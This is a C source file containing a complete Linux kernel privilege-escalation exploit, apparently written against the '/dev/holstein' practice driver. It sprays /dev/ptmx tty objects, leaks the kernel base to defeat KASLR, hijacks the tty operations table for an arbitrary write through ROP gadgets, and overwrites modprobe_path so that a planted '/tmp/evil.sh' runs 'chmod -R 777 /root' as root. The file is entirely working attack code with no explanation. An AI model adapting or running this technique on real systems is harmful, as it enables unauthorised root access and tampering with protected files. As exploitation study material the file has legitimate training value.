#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc38880
#define addr_modprobe_path (kbase + 0xe38180)
#define rop_mov_qrdx_rcx (kbase + 0x0477f7)
#define rop_mov_rax_qrdx (kbase + 0x18a285)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;
uint64_t kbase, g_buf;
int spray[100];
int fd;
char buf[0x500];

void AAW32(unsigned long addr, unsigned int val) {
    unsigned long *p = (unsigned long *)&buf;
    p[12] = rop_mov_qrdx_rcx; // ioctl soutou
    *(unsigned long*)&buf[0x418] = g_buf; // overwrite ops table with buf address
    write(fd, buf, 0x420);

    for (int i = 0; i < 100; i++) {
        ioctl(spray[i], val /* rcx */, addr /*rdx*/);
    }
}

int main()
{
    // START SPRAY
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }

    fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
        ERROR("/dev/holstein");

    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }
    // END SPRAY

    // KASLRの回避
    read(fd, buf, 0x500);

    kbase = *(uint64_t*)&buf[0x418] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    g_buf = *(uint64_t*)&buf[0x438] - 0x438;
    printf("[+] g_buf = 0x%016lx\n", g_buf);
    // END KASLRの回避

    char cmd[] = "/tmp/evil.sh";
    for (int i = 0; i < sizeof(cmd); i += 4) {
        AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
    }

    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
    system("chmod +x /tmp/evil.sh");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");

    close(fd);
    return 0;
}